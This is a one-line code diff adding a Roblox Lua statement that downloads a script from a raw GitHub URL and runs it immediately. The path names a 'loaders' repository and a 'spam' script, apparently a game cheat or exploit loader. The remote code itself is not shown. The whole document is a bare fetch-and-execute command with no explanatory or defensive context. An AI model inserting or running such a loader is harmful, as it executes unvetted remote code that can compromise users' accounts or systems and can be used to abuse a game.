@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/mechagodzilla2021-remodel-kaiju-alpha-spam3-r1rlhn0vo9eegr.lua"))()
